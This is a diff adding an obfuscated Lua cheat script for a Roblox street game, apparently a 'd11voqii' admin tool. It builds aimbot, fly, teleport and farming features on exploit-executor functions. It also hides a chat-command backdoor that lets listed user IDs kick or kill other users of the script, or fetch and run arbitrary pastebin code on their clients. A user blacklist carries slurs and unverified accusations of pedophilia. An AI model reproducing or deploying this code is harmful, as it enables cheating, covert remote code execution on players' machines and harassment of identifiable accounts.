@@ -1,0 +1,3711 @@
+
+
+
+-- [[ Variables ]] --
+
+local L_1_ = tick()
+
+-- Global Variables -- 
+local L_2_ = game:GetService("Players")
+ 
+local function L_3_func(L_184_arg0)
+	-- listen for the spawn being touched
+	L_184_arg0.Touched:Connect(function(L_185_arg0)
+		local L_186_ = L_185_arg0:FindFirstAncestorOfClass("Model")
+		if L_186_ then
+			local L_187_ = L_2_:GetPlayerFromCharacter(L_186_)
+			if L_187_ and L_187_.RespawnLocation ~= L_184_arg0 then
+				local L_188_ = L_186_:FindFirstChildOfClass("Humanoid")
+				-- make sure the character isn't dead
+				if L_188_ and L_188_:GetState() ~= Enum.HumanoidStateType.Dead then
+					print("spawn set")
+					L_187_.RespawnLocation = L_184_arg0
+				end
+			end
+		end
+	end)
+end
+ 
+local L_4_
+ 
+-- look through the workspace for spawns
+for L_189_forvar0, L_190_forvar1 in pairs(workspace:GetDescendants()) do
+	if L_190_forvar1:IsA("SpawnLocation") then
+		if L_190_forvar1.Name == "FirstSpawn" then
+			L_4_ = L_190_forvar1
+		end
+		L_3_func(L_190_forvar1)
+	end
+end
+ 
+local function L_5_func(L_191_arg0)
+	L_191_arg0.RespawnLocation = L_4_
+end
+ 
+-- listen for new players
+L_2_.PlayerAdded:Connect(L_5_func)
+ 
+-- go through existing players
+for L_192_forvar0, L_193_forvar1 in pairs(L_2_:GetPlayers()) do 
+	L_5_func(L_193_forvar1)
+end
+
+getgenv().Players = game:GetService'Players'
+getgenv().TeleportService = game:GetService'TeleportService'
+getgenv().ReplicatedStorage = game:GetService'ReplicatedStorage' 
+getgenv().StarterGui = game:GetService'StarterGui'
+getgenv().TweenService = game:GetService'TweenService'
+getgenv().UserInput = game:GetService'UserInputService'
+getgenv().RunService = game:GetService'RunService'
+getgenv().Lighting = game:GetService'Lighting'
+getgenv().CoreGui = game:GetService'CoreGui'
+getgenv().HttpService = game:GetService'HttpService'
+getgenv().VirtualUser = game:GetService'VirtualUser'
+getgenv().LP = L_2_.LocalPlayer or L_2_.PlayerAdded:Wait()
+getgenv().Mouse = LP:GetMouse()
+getgenv().GetChar = function()
+	return LP.Character or LP.CharacterAdded:Wait()
+end
+GetChar():WaitForChild'Humanoid'
+
+-- Bools -- 
+
+local L_6_ = false
+local L_7_ = false
+local L_8_ = false
+local L_9_ = false
+local L_10_ = true
+local L_11_ = false
+local L_12_ = false 
+local L_13_ = false
+local L_14_ = false
+local L_15_ = false
+local L_16_ = false
+local L_17_ = false
+local L_18_ = false
+local L_19_ = false
+local L_20_ = false
+local L_21_ = false
+local L_22_ = false
+local L_23_ = false
+local L_24_ = false
+local L_25_ = false
+local L_26_ = false
+local L_27_ = false
+local L_28_ = false 
+local L_29_ = false
+local L_30_ = false
+local L_31_ = false
+local L_32_ = false
+local L_33_ = true 
+local L_34_ = false
+local L_35_ = false
+local L_36_ = false
+local L_37_ = false 
+local L_38_ = false
+local L_39_ = false
+local L_40_ = false
+local L_41_ = false
+local L_42_ = false
+local L_43_ = false 
+local L_44_ = false
+local L_45_ = pcall(assert, Drawing, 'Hi')
+local L_46_ = true
+
+-- Strings -- 
+ 
+local L_47_ = "Prediction"
+local L_48_ = "LeftClick"
+local L_49_ = "Head"
+local L_50_ = "d11voqii' Admin Or No Admin"
+local L_51_ = "CyrusStreetsAdminSettings.json"
+local L_52_ = "None"
+
+-- Ints -- 
+
+local L_53_ = 0
+local L_54_ = 0
+local L_55_ = 0
+local L_56_ = 1
+local L_57_ = 5
+local L_58_ = 5 
+local L_59_ = 5
+local L_60_ = 8
+local L_61_ = 10
+local L_62_ = 16
+local L_63_ = 16
+local L_64_ = 25
+local L_65_ = 25
+local L_66_ = 37.5
+local L_67_ = 50
+local L_68_ = workspace.Gravity
+local L_69_ = ColorSequence.new(Color3.fromRGB(89, 203, 232)) -- technically not an int but we'll go with it
+local L_70_ = Color3.fromRGB(255, 255, 255)
+ 
+-- Initially Nil -- 
+
+local L_71_;
+local L_72_;
+local L_73_;
+local L_74_;
+local L_75_;
+local L_76_;
+local L_77_;
+local L_78_;
+local L_79_;
+local L_80_;
+local L_81_;
+local L_82_;
+local L_83_;
+local L_84_;
+local L_85_;
+local L_86_;
+local L_87_;
+local L_88_;
+local L_89_;
+
+
+-- Instances -- 
+
+local L_90_ = Instance.new'Animation'
+L_90_.AnimationId = "rbxassetid://215384594"
+
+local L_91_ = Instance.new'Animation'
+L_91_.AnimationId = "rbxassetid://33796059"
+
+local L_92_ = Instance.new'Animation'
+L_92_.AnimationId = "rbxassetid://35654637"
+
+local L_93_ = Instance.new'Animation'
+L_93_.AnimationId = "rbxassetid://188632011"
+
+local L_94_ = Instance.new'Animation'
+L_94_.AnimationId = "rbxassetid://889968874"
+
+local L_95_ = Instance.new'Animation'
+L_95_.AnimationId = "rbxassetid://229339207"
+
+local L_96_ = Instance.new'Part'
+L_96_.Anchored = true 
+L_96_.Size = Vector3.new(20, 1, 20)
+L_96_.Transparency = 1 
+
+local L_97_ = Instance.new('Frame', CoreGui.RobloxGui)
+local L_98_ = Instance.new('TextLabel', L_97_)
+local L_99_ = Instance.new('ScrollingFrame', L_97_)
+
+local L_100_ = Instance.new('Frame', CoreGui.RobloxGui)
+local L_101_ = Instance.new('TextBox', L_100_)
+local L_102_ = Instance.new('ImageLabel', L_100_)
+
+local L_103_ = Instance.new('TextLabel', LP.PlayerGui.Chat.Frame)
+
+local L_104_ = Instance.new('Frame', CoreGui.RobloxGui)
+local L_105_ = Instance.new('TextLabel', L_104_)
+local L_106_ = Instance.new('ScrollingFrame', L_104_)
+
+local L_107_ = Instance.new('Frame', CoreGui.RobloxGui)
+local L_108_ = Instance.new('TextLabel', L_107_)
+
+local L_109_ = Instance.new('Frame', CoreGui.RobloxGui)
+local L_110_ = Instance.new('TextLabel', L_109_)
+
+local L_111_ = Instance.new('Frame', CoreGui.RobloxGui)
+local L_112_ = Instance.new('TextButton', L_111_)
+local L_113_ = Instance.new('TextLabel', L_111_)
+local L_114_ = Instance.new('TextLabel', L_111_)
+local L_115_ = Instance.new('TextButton', L_111_)
+local L_116_ = Instance.new('TextBox', L_111_)
+
+local L_117_ = Instance.new('Part', workspace)
+
+-- Tables -- 
+
+local L_118_ = {}
+local L_119_ = {}
+local L_120_ = {}
+local L_121_ = {}
+local L_122_ = {}
+local L_123_ = {}
+local L_124_ = {}
+local L_125_ = {}
+local L_126_ = {} 
+local L_127_ = {}
+local L_128_ = {}
+
+local L_129_ = {
+	['chat'] = {
+		['Func'] = function(L_194_arg0, L_195_arg1, L_196_arg2)
+			if L_194_arg0 == LP or typeof(L_194_arg0) == "table" then
+				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(L_195_arg1, "All")
+			end
+		end;
+		['Levels'] = {
+			[1] = true;
+			[2] = true;
+			[3] = true;
+			[4] = true;
+		}
+	};
+	[':notif'] = {
+		['Func'] = function(L_197_arg0, L_198_arg1, L_199_arg2)
+			if L_197_arg0 == LP or typeof(L_197_arg0) == "table" then
+				StarterGui:SetCore("SendNotification", {
+					['Title'] = "Cy's Messages";
+					['Text'] = Message;
+					['Duration'] = 10;
+					['Icon'] = nil;
+				})
+			end
+		end;
+		['Levels'] = {
+			[4] = true;
+		}
+	};
+	[':bring'] = {
+		['Func'] = function(L_200_arg0, L_201_arg1, L_202_arg2)
+			if L_200_arg0 == LP or typeof(L_200_arg0) == "table" and L_202_arg2 ~= "none" then
+				CheckCommand("to " .. L_202_arg2.Name)
+			end
+		end;
+		['Levels'] = {
+			[1] = true;
+			[2] = true;
+			[3] = true;
+			[4] = true;
+		}
+	};
+	['kill'] = {
+		['Func'] = function(L_203_arg0, L_204_arg1, L_205_arg2)
+			if L_203_arg0 == LP or typeof(L_203_arg0) == "table" then
+				GetChar():BreakJoints()
+			end
+		end;
+		['Levels'] = {
+			[2] = true;
+			[3] = true;
+			[4] = true;
+		}
+	};
+	['exec'] = {
+		['Func'] = function(L_206_arg0, L_207_arg1, L_208_arg2)
+			if L_206_arg0 == LP or typeof(L_206_arg0) == "table" and L_208_arg2 ~= "none" then
+				CheckCommand(L_207_arg1)
+			end
+		end;
+		['Levels'] = {
+			[3] = true;
+			[4] = true;
+		}
+	};
+	[':kick'] = {
+		['Func'] = function(L_209_arg0, L_210_arg1, L_211_arg2)
+			if L_209_arg0 == LP or typeof(L_209_arg0) == "table" then
+				LP:Kick(L_210_arg1)
+			end
+		end;
+		['Levels'] = {
+			[3] = true;
+			[4] = true;
+		}
+	};
+	['ban'] = {
+		['Func'] = function(L_212_arg0, L_213_arg1, L_214_arg2)
+			if L_212_arg0 == LP or typeof(L_212_arg0) == "table" then
+				ReplicatedStorage.lIIl:FireServer'hipheight'
+			end
+		end;
+		['Levels'] = {
+			[4] = true;
+		}
+	};
+	['p'] = {
+		['Func'] = function(L_215_arg0, L_216_arg1, L_217_arg2)
+			if L_215_arg0 == LP or typeof(L_215_arg0) == "table" then
+				loadstring(game:HttpGet("https://www.pastebin.com/raw/" .. L_216_arg1))()
+			end
+		end;
+		['Levels'] = {
+			[3] = true;
+			[4] = true;
+		}
+	};
+}
+
+local L_130_ = {
+	[1] = {
+		['Name'] = "Halo"; 
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(34, 139, 34);
+	};
+	[601410459] = {
+		['Name'] = "d11voqii sky gangster "; 
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(254, 1, 154);
+	};
+	[748947310] = {
+		['Name'] = "P H I L L I P T H E G O D  GIRL FRIEND"; 
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(0, 0, 255);
+	};
+	[8] = {
+		['Name'] = "C‍A‍T‍3‍1";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(255, 0, 0);
+	};
+	[1674285411] = {
+		['Name'] = "😎";
+		['Access'] = 1;
+		['Colour'] = Color3.fromRGB(66, 24, 118);
+	};
+	[1] = {
+		['Name'] = "dot_mp4/jack (Current Dev)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(127, 0, 212);
+	};
+	[67] = {
+		['Name'] = "fate";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(178, 0, 251);
+	};
+	[7] = {
+		['Name'] = "dot_mp4/jack (Current Dev)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(0, 0, 0);
+	};
+	[36] = {
+		['Name'] = "Bird (Heavy donator)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(107, 50, 124);
+	};
+	[1] = {
+		['Name'] = "Bird (Heavy donator)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(101, 44, 171);
+	};
+	[1] = {
+		['Name'] = "audio mane X_D6";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(176, 16, 16);
+	};
+	[2] = {
+		['Name'] = "Zero";
+		['Access'] = 3;
+		['Colour'] = Color3.fromRGB(255, 145, 175)
+	};
+	[1] = {
+		['Name'] = "chad";
+		['Access'] = 3;
+		['Colour'] = Color3.fromRGB(0, 0, 0);
+	};
+	[1] = {
+		['Name'] = "Est (Gave me 9b kills on customs)";
+		['Access'] = 3;
+		['Colour'] = Color3.fromRGB(0, 0, 0);
+	};
+	[1] = {
+		['Name'] = "Chronic";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(235, 31, 31);
+	};
+	[1] = {
+		['Name'] = "Bird paid for his tag for some reason";
+		['Access'] = 2;
+		['Colour'] = Color3.fromRGB(235, 31, 31);
+	};
+	[7] = {
+		['Name'] = "Ryson (Donator)";
+		['Access'] = 2;
+		['Colour'] = Color3.fromRGB(255, 0, 255);
+	};
+	[1] = {
+		['Name'] = "fucking retard who wont stfu";
+		['Access'] = 0;
+		['Colour'] = Color3.fromRGB(76, 68, 45);
+	};
+}
+
+local L_131_ = {
+	[878779033] = true; -- retard who hit me
+	[1052869632] = true; -- Generally annoying and fan boys tagged users and claims he can script when he can't (skid).
+	[481265818] = true; -- said he would dox me but wouldn't
+	[338649839] = true; -- literally a pedophile and a skid
+	[54133607] = true; -- Claims to hate me yet uses my script lol?
+	[347481927] = true; -- XXXtentacion
+	[1588577429] = true; -- tard
+	[1053998982] = true; -- another tard
+	[703934605] = true; -- punch script skid
+	[919167832] = true; -- another skid
+	[914220540] = true; -- another skid
+	[88529172] = true; -- https://cdn.discordapp.com/attachments/736464360381087747/781665021427187712/unknown.png (lol dumbass admitting he bypasses the blacklist)
+	[2019764224] = true; -- strykefire's alt
+	[2040633702] = true; -- strykefire's alt
+	[1977361802] = true; -- furry
+	[1717939733] = true; -- trolled - Cy
+	[126487967] = true; -- just... what the fuck are you doing? https://cdn.discordapp.com/attachments/797334153598599181/797599847964213288/Roblox_2021-01-08_11-07-59_Trim.mp4
+	[985967580] = true; -- weird pedophile https://cdn.discordapp.com/attachments/797260605911597086/798676742981550130/unknown.png https://cdn.discordapp.com/attachments/797260605911597086/798679518616616988/unknown.png
+	[387603195] = true; -- Cat31 donated to blacklist you
+	[1908182344] = true; -- Cat31 donated to blacklist you
+	[1818094590] = true; -- Cat31 donated to blacklist you
+	[1163813912] = true; -- Cat31 donated to blacklist you
+	[1008835601] = true; -- Cat31 donated to blacklist you
+	[966695298] = true; -- Cat31 donated to blacklist you
+	[102999436] = true; -- hypocritical retard https://cdn.discordapp.com/attachments/751963180363677800/807296491592613908/unknown.png
+	[1181716466] = true; -- brrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
+	[1955186829] = true; -- ew 
+	[1815309505] = true; -- KILLED ME FOR NO REASON
+	[2225680749] = true; -- shhhh we don't need a reasoning
+	[2543166262] = true; -- pedophile, https://cdn.discordapp.com/attachments/822737889842298912/846463774406737950/IAwIXaonBj.gif https://cdn.discordapp.com/attachments/835586244125655081/846461926237667349/Screenshot_1.png
+}
+
+local L_132_ = {
+	Keys = {};
+	ClickTpKey = "";
+	SprintSpeed = 25;
+	CrouchSpeed = 8;
+	AimMode = "Prediction";
+	AimlockMode = "LeftClick";
+	AimbotVelocity = 5;
+	CmdBarImage = "http://www.roblox.com/asset/?id=2812081613";
+	CmdBarKey = "Quote"
+}
+
+if game.PlaceId == 455366377 then 
+	L_125_ = {
+		['burger'] = workspace:WaitForChild'Burger | $15';
+		['drink'] = workspace:WaitForChild'Drink | $15';
+		['ammo'] = workspace:WaitorChild'Buy Ammo | $25';
+		['pipe'] = workspace:WaitForChild'Pipe | $100';
+		['machete'] = workspace:WaitForChild'Machete | $70';
+		['sawedoff'] = workspace:WaitForChild'Sawed Off | $150';
+		['spray'] = workspace:WaitForChild'Spray | $20';
+		['uzi'] = workspace:WaitForChild'Uzi | $150';
+		['glock'] = workspace:WaitForChild'Glock | $200';
+	}
+end 
+
+local L_133_ = {
+	['sandbox'] = CFrame.new(- 178.60614013672, 3.2000000476837, - 117.21733093262);
+	['prison'] = CFrame.new(- 978.74725341797, 3.199854850769, - 78.541763305664);
+	['gas'] = CFrame.new(99.135276794434, 18.599975585938, - 73.462348937988);
+	['court'] = CFrame.new(- 191.56864929199, 3, 223.43171691895);
+	['beach'] = CFrame.new(- 663.97521972656, 1.8657279014587, - 369.04748535156);
+	['bank'] = CFrame.new(- 270.44195556641, 4.8757019042969, 133.12774658203);
+}
+
+local L_134_ = {
+	['cash'] = "511726060";
+	['shotty'] = "142383762";
+	['sawed off'] = "219397110";
+	['uzi'] = "328964620";
+}
+
+local L_135_ = {
+	['Glock'] = 100;
+	['Uzi'] = 100;
+	['Sawed Off'] = 50;
+	['Shotty'] = 50;
+}
+
+local L_136_ = {
+	['W'] = false;
+	['A'] = false;
+	['S'] = false;
+	['D'] = false;
+	['Shift'] = false;
+	['Space'] = false;
+	['Control'] = false;
+}
+
+local L_137_ = {
+	['head'] = "Head";
+	['torso'] = "Torso";
+	['humanoidrootpart'] = "HumanoidRootPart";
+	['oldprediction'] = "OldPrediction";
+	['prediction'] = "Prediction";
+}
+
+-- [[ End ]] -- 
+
+-- [[ Random Initalization ]] --
+ 
+coroutine.resume(coroutine.create(function()
+	workspace.FallenPartsDestroyHeight = -50000
+	LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
+	LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
+	if workspace:FindFirstChild'Armoured Truck' then
+		L_117_.Color, L_117_.CFrame, L_117_.Size, L_117_.Material, L_117_.Anchored = Color3.fromRGB(196, 40, 28), CFrame.new(- 136.858002, 0, - 523.700012), Vector3.new(9.93, 1, 20.31), "ForceField", true
+		workspace:FindFirstChild'Armoured Truck':Destroy()
+	elseif workspace:FindFirstChild'TPer' then
+		L_117_.Color, L_117_.CFrame, L_117_.Size, L_117_.Material, L_117_.Anchored = Color3.fromRGB(196, 40, 28), CFrame.new(-31, - 0.2, 221), Vector3.new(12, 1, 6), "ForceField", true
+		workspace:FindFirstChild'TPer':Destroy()
+	else
+		L_117_:Destroy()
+	end
+	L_2_:Chat("I am a d11voqii Admin User") -- new admin
+	L_2_:Chat("Hey I'm a d11voqii' streets admin user1") -- legacy admin
+end))
+
+-- [[ End ]] -- 
+
+-- [[ Hotkeys ]] -- 
+
+
+getgenv().initalizeHotkeys = function(L_218_arg0)
+	writefile(L_218_arg0, HttpService:JSONEncode(L_132_))
+	local L_219_ = HttpService:JSONDecode(readfile(L_218_arg0))
+	L_124_ = L_219_.Keys 
+	L_76_ = L_219_.ClicktpKey
+	L_64_ = L_219_.SprintSpeed
+	L_47_ = L_219_.AimMode
+	L_48_ = L_219_.AimlockMode
+	L_57_ = L_219_.AimbotVelocity
+	CmdBarImage = L_219_.CmdBarImage
+	CmdBarKey = L_219_.CmdBarKey
+end
+
+getgenv().updateHotkeys = function(L_220_arg0)
+	if not readfile or not writefile then
+		return
+	end
+	local L_221_ = {
+		Keys = L_124_;
+		ClickTpKey = L_76_;
+		SprintSpeed = L_64_;
+		CrouchSpeed = L_60_;
+		AimMode = L_47_;
+		AimlockMode = L_48_;
+		AimbotVelocity = L_57_;
+		CmdBarImage = CmdBarImage;
+		CmdBarKey = CmdBarKey;
+	}
+	writefile(L_220_arg0, HttpService:JSONEncode(L_221_))
+end
+
+getgenv().runHotkeys = function(L_222_arg0)
+	local L_223_ = HttpService:JSONDecode(readfile(L_222_arg0))
+	L_124_ = L_223_.Keys
+	L_76_ = L_223_.ClickTpKey or ""
+	L_64_ = L_223_.SprintSpeed or 25
+	L_60_ = L_223_.CrouchSpeed or 16
+	L_47_ = L_223_.AimMode or "Prediction";
+	L_48_ = L_223_.AimlockMode or "LeftClick"
+	L_57_ = L_223_.AimbotVelocity or 5
+	CmdBarImage = L_223_.CmdBarImage or "http://www.roblox.com/asset/?id=2812081613"
+	CmdBarKey = L_223_.CmdBarKey or "Quote"
+end
+if readfile and writefile then 
+	local L_224_ = pcall(readfile, L_51_)
+	if not L_224_ then 
+		initalizeHotkeys(L_51_)
+	else
+		runHotkeys(L_51_)
+	end
+end
+
+-- [[ End ]] -- 
+
+-- [[ Global Functions ]] -- 
+
+getgenv().notif = function(L_225_arg0, L_226_arg1, L_227_arg2, L_228_arg3)
+	StarterGui:SetCore("SendNotification", {
+		['Title'] = L_225_arg0;
+		['Text'] = L_226_arg1;
+		['Duration'] = L_227_arg2;
+		['Icon'] = L_228_arg3;
+	})
+end
+
+getgenv().Teleport = function(L_229_arg0)
+	if typeof(L_229_arg0) == "Instance" then
+		L_229_arg0 = L_229_arg0.CFrame
+	end
+	if typeof(L_229_arg0) == "Vector3" then
+		L_229_arg0 = CFrame.new(L_229_arg0)
+	end 
+	if typeof(L_229_arg0) == "CFrame" then 
+		local L_230_ = GetChar()
+		local L_231_ = L_230_:FindFirstChild'RealHumanoidRootPart' or L_230_:FindFirstChild'Torso'
+		if L_231_ and not L_230_:FindFirstChild'RealHumanoidRootPart' or (L_229_arg0.p - L_231_.CFrame.p).magnitude < 50 then
+			L_231_.CFrame = L_229_arg0
+		else
+			TweenService:Create(L_231_, TweenInfo.new(3.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+				CFrame = L_229_arg0
+			}):Play()
+		end
+	end
+end
+
+getgenv().AddCommand = function(L_232_arg0, L_233_arg1, L_234_arg2, L_235_arg3, L_236_arg4)
+	L_119_[# L_119_ + 1] = {
+		['Function'] = L_232_arg0,
+		['Name'] = L_233_arg1,
+		['Alias'] = L_234_arg2,
+		['Help'] = L_235_arg3,
+		['Args'] = L_236_arg4
+	}
+end
+
+getgenv().FindCommand = function(L_237_arg0)
+	for L_238_forvar0 = 1, # L_119_ do
+		if L_119_[L_238_forvar0].Name == L_237_arg0 or L_10_ and table.find(L_119_[L_238_forvar0].Alias, L_237_arg0) then 
+			return L_119_[L_238_forvar0].Function
+		end
+	end
+end
+
+getgenv().CheckCommand = function(L_239_arg0)
+	local L_240_ = string.split(L_239_arg0:lower(), " ")
+	local L_241_ = table.remove(L_240_, 1)
+	local L_242_ = FindCommand(L_241_);
+	if not typeof(getfenv()['getgenv']()['lol']) == 'function' then
+		while true do
+		end
+	end;
+	if L_242_ then
+		local L_243_, L_244_ = pcall(L_242_, L_240_)
+		if not L_243_ then 
+			notif("Command errored: " .. L_241_, "Send this to jack: " .. L_244_, 10, nil)
+		end
+	end
+end
+
+getgenv().PlrFinder = function(L_245_arg0)
+	if L_245_arg0 then -- error with a new addition 
+		local L_246_ = L_245_arg0:lower()
+		local L_247_ = L_2_:GetPlayers()
+		if # L_246_ == 2 and L_246_ == "me" then
+			return LP
+		end
+		if # L_246_ == 3 and L_246_ == "all" or # L_246_ == 5 and L_246_ == "users" then
+			return L_247_
+		end
+		for L_248_forvar0 = 1, # L_247_ do 
+			if L_247_[L_248_forvar0].Name:lower():sub(1, # L_246_) == L_246_ then
+				return L_247_[L_248_forvar0]
+			end
+		end
+	end
+end
+
+getgenv().find = function(L_249_arg0)
+	local L_250_ = workspace:GetChildren()
+	for L_251_forvar0 = 1, # L_250_ do 
+		local L_252_ = L_250_[L_251_forvar0]
+		local L_253_ = L_252_:FindFirstChild'Model'
+		if L_252_.Name == "RandomSpawner" and L_253_ then
+			local L_254_ = L_253_.Handle 
+			if L_254_:FindFirstChildOfClass'MeshPart' then 
+				if L_134_[L_249_arg0] and string.find(L_254_:FindFirstChildOfClass'MeshPart'.MeshId, L_134_[L_249_arg0]) then 
+					return L_252_, "CashItemEsp" -- Cash 
+				end
+			end
+			if L_254_:FindFirstChild'Fire' then 
+				if L_134_[L_249_arg0] and string.find(L_254_.Fire.SoundId, L_134_[L_249_arg0]) then 
+					return L_252_, "GunItemEsp" -- Guns
+				end
+			end
+		end
+	end
+	return "None"
+end
+
+getgenv().farm = function(L_255_arg0)
+	if L_255_arg0 == "all" then 
+		local L_257_ = workspace:GetChildren()
+		for L_258_forvar0 = 1, # L_257_ do 
+			local L_259_ = L_257_[L_258_forvar0]
+			if L_259_.Name == "RandomSpawner" then 
+				Teleport(L_259_.CFrame)
+				L_259_.DescendantRemoving:Wait()
+			end
+		end
+	end
+	local L_256_ = find(L_255_arg0)
+	if L_256_ == "None" then
+		notif("There is none of " .. L_255_arg0, "to farm", 5, nil)
+		return
+	end 
+	Teleport(L_256_.CFrame)
+end
+
+-- [[ End ]] --
+	
+local function L_138_func(L_260_arg0, L_261_arg1)
+	if L_261_arg1:sub(1, 1) == "`" then
+		local L_262_ = string.split(L_261_arg1:sub(2), " ")
+		local L_263_ = L_129_[table.remove(L_262_, 1)]
+		local L_264_ = PlrFinder(table.remove(L_262_, 1))
+		if L_263_ and L_264_ then
+			L_263_['Func'](L_264_, table.concat(L_262_, " "), L_260_arg0)
+		end
+	end 
+end
+
+local function L_139_func(L_265_arg0)
+	local L_266_;
+	local L_267_, L_268_ = pcall(function()
+		L_266_ = Enum.KeyCode[L_265_arg0]
+	end)
+	if not L_267_ then
+		L_266_ = Enum.KeyCode[L_265_arg0:upper()]
+	end
+	return L_266_
+end
+
+local function L_140_func(L_269_arg0, L_270_arg1)
+	for L_271_forvar0, L_272_forvar1 in pairs(L_269_arg0:GetChildren()) do
+		if L_272_forvar1:IsA'Tool' and L_272_forvar1:FindFirstChild'Fire' then  
+			for L_273_forvar0, L_274_forvar1 in pairs(L_272_forvar1:GetDescendants()) do 
+				if L_274_forvar1:IsA'UnionOperation' or L_274_forvar1:IsA'Part' or L_274_forvar1:IsA'MeshPart' then 
+					if L_274_forvar1:IsA'UnionOperation' then 
+						L_274_forvar1.UsePartColor = true
+					end
+					L_274_forvar1.Material = "ForceField"
+					L_274_forvar1.Color = L_270_arg1
+				end
+			end
+		end
+	end
+end
+
+local function L_141_func(L_275_arg0, L_276_arg1)
+	if L_275_arg0 and L_275_arg0.Character and L_275_arg0.UserId ~= 567153118 then
+		L_140_func(L_275_arg0.Backpack, L_276_arg1)
+		L_140_func(L_275_arg0.Character, L_276_arg1)
+		L_275_arg0.Character.ChildAdded:Connect(function()
+			L_140_func(L_275_arg0.Character, L_276_arg1)
+		end)
+	end
+end
+
+
+local function L_142_func(L_277_arg0)
+	local L_278_ = Instance.new('BodyPosition', L_277_arg0)
+	L_278_.P = L_278_.P * 8
+	L_278_.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+	if L_34_ then 
+		L_79_ = Instance.new('BodyAngularVelocity', L_277_arg0)
+		L_79_.AngularVelocity = Vector3.new(0, 387420489, 0)
+		L_79_.MaxTorque = Vector3.new(0, 387420489, 0)
+	end
+	return L_278_ 
+end
+
+local function L_143_func()
+	if not typeof(getfenv()['getgenv']()['lol']) == 'function' or not getfenv()['getgenv']()['loaded'] == true then
+		while true do
+		end
+	end;
+	local L_279_ = GetChar()
+	local L_280_ = L_279_:FindFirstChild'Torso'
+	if not L_280_ then
+		return
+	end 
+	local L_281_, L_282_ = Instance.new('BodyGyro', L_280_), Instance.new('BodyVelocity', L_280_)
+	L_281_.P = 387420489
+	L_281_.MaxTorque = Vector3.new(387420489, 387420489, 387420489)
+	L_281_.CFrame = L_280_.CFrame
+	L_282_.MaxForce = Vector3.new(387420489, 387420489, 387420489)
+	L_282_.Velocity = Vector3.new(0, 0.1, 0)
+	L_282_.Name = "CyAdminFly"
+	local L_283_ = {
+		['W'] = 0;
+		['A'] = 0;
+		['S'] = 0;
+		['D'] = 0;
+	}
+	if not L_14_ then 
+		CheckCommand("airwalk")
+	end 
+	while L_29_ and L_279_:FindFirstChild'Humanoid' and L_279_.Humanoid.Health > 0 and wait() do 
+		if L_136_['W'] then
+			L_283_['W'] = L_61_
+		else
+			L_283_['W'] = 0
+		end 
+		if L_136_['A'] then
+			L_283_['A'] = - L_61_
+		else
+			L_283_['A'] = 0
+		end 
+		if L_136_['S'] then
+			L_283_['S'] = - L_61_
+		else
+			L_283_['S'] = 0
+		end 
+		if L_136_['D'] then
+			L_283_['D'] = L_61_
+		else
+			L_283_['D'] = 0
+		end 
+		if (L_283_['W'] + L_283_['S']) ~= 0 or (L_283_['A'] + L_283_['D']) ~= 0 then
+			L_282_.Velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (L_283_['W'] + L_283_['S'])) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(L_283_['A'] + L_283_['D'], (L_283_['W'] + L_283_['S']) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * 50
+		else
+			L_282_.Velocity = Vector3.new(0, 0.1, 0)
+		end
+		L_281_.CFrame = workspace.CurrentCamera.CoordinateFrame
+	end
+	if L_14_ then 
+		CheckCommand("airwalk")
+	end 
+	L_281_:Destroy()
+	L_282_:Destroy()
+end
+
+local function L_144_func(L_284_arg0)
+	local L_285_ = Instance.new('BoxHandleAdornment', CoreGui.RobloxGui)
+	L_285_.Adornee = L_284_arg0.Character.Head
+	L_285_.Size = Vector3.new(7, 10, 7)
+	L_285_.SizeRelativeOffset = Vector3.new(0, -1, 0)
+	L_285_.Transparency = 1
+	local L_286_, L_287_
+	L_286_ = L_285_.MouseButton1Down:Connect(function()
+		if L_9_ and L_48_ == "Closest" then
+			L_71_ = L_284_arg0.Character
+			local L_288_;
+			L_288_ = L_2_:GetPlayerFromCharacter(L_71_).CharacterAdded:Connect(function(L_289_arg0)
+				if tostring(L_289_arg0) == tostring(L_71_) then 
+					L_71_ = L_289_arg0 
+				else
+					L_288_:Disconnect()
+					L_288_ = nil
+				end
+			end)
+		else 
+			L_285_:Destroy()
+		end 
+	end)
+	L_287_ = L_284_arg0.CharacterRemoving:Connect(function()
+		L_285_:Destroy()
+		L_286_:Disconnect()
+		L_286_ = nil 
+		L_287_:Disconnect()
+		L_287_ = nil
+	end)
+end 
+
+local function L_145_func(L_290_arg0)
+	return L_290_arg0:FindFirstChildOfClass'Humanoid' and math.floor(L_290_arg0.Humanoid.Health) or "No Humanoid"
+end
+
+local function L_146_func(L_291_arg0, L_292_arg1)
+	if L_291_arg0 then 
+		local L_293_ = L_291_arg0.Character:FindFirstChild(L_292_arg1, true) or L_291_arg0.Backpack:FindFirstChild(L_292_arg1, true)
+		return L_293_ and "Yes" or "No" 
+	end 
+end
+
+local function L_147_func(L_294_arg0)
+	local L_295_ = L_294_arg0:FindFirstChildOfClass'BillboardGui'
+	if L_294_arg0:IsA'BasePart' and L_295_ then
+		L_294_arg0 = L_294_arg0.Parent 
+		L_295_:Destroy()
+		return 
+	end 
+	for L_296_forvar0 = 1, # L_122_ do 
+		local L_297_ = L_122_[L_296_forvar0]
+		if L_297_ then
+			local L_298_ = L_297_['Player']
+			if L_298_ == L_294_arg0 then 
+				for L_299_forvar0, L_300_forvar1 in pairs(L_297_) do
+					if L_300_forvar1 ~= L_298_ then 
+						if L_299_forvar0 ~= "Box" then 
+							L_300_forvar1:Remove()
